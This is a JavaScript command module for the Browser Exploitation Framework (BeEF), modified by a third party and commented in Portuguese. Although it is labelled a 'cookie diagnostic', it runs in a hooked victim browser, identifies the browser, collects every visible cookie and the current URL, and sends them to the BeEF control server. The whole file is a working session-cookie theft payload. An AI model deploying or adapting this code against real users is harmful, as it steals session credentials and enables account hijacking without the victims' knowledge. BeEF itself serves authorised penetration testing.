//
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
// modded by wrxxnch
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function () {
    var ua = navigator.userAgent;
    var navegador = "unknown";

    // Identificação do Navegador
    if (ua.indexOf("Firefox/") !== -1) {
        navegador = "Firefox";
    } else if (ua.indexOf("Edg/") !== -1) {
        navegador = "Edge";
    } else if (ua.indexOf("OPR/") !== -1) {
        navegador = "Opera";
    } else if (ua.indexOf("Chrome/") !== -1) {
        navegador = "Chrome";
    } else if (ua.indexOf("Safari/") !== -1 && ua.indexOf("Chrome/") === -1) {
        navegador = "Safari";
    }

    // Coleta de Cookies
    var cookies = document.cookie ? document.cookie.split(";") : [];
    var quantidadeCookies = cookies.length;

    var resultado = {
        mode: "<%== @url %>" === "default_all" ? "default_all" : "especifico",
        browser: navegador,
        documentCookieDisponivel: typeof document.cookie === "string",
        quantidadeCookiesVisiveis: quantidadeCookies,
		cookies: cookies,
        url_atual: window.location.href,
        timestamp: new Date().toISOString()
    };

    // Log no console do BeEF para debug
    beef.debug("[Cookie Diagnostic] " + JSON.stringify(resultado));

    // Envio dos dados para o painel de controle do BeEF
    beef.net.send(
        "<%= @command_url %>",
        <%= @command_id %>,
        "diagnostico: " + JSON.stringify(resultado)
    );
});
